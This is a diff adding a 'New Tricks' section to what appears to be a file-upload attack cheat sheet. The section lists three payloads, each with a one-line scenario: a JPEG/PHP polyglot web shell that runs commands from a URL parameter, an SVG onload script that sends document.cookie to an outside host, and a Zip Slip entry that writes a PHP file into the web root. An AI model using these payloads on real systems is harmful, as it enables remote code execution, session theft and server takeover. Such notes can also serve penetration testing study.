@@ -66,3 +66,17 @@ XSS
     <script type="text/javascript">alert(window.origin);</script>
 </svg>
 ````
+
+## New Tricks
+
+### Trick 1
+- Scenario: JPEG avatar parser accepted PHP polyglot after weak MIME check.
+- Payload: `filename=shell.php.jpg ; content starts with: ÿØÿ ... <?php system($_GET['cmd']); ?>`
+
+### Trick 2
+- Scenario: SVG upload executed script in admin preview panel.
+- Payload: `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(`https://x.tld/?c=`+document.cookie)"/>`
+
+### Trick 3
+- Scenario: Zip extraction wrote webshell outside uploads using Zip Slip.
+- Payload: `zip entry name: ../../../../var/www/html/poc.php`
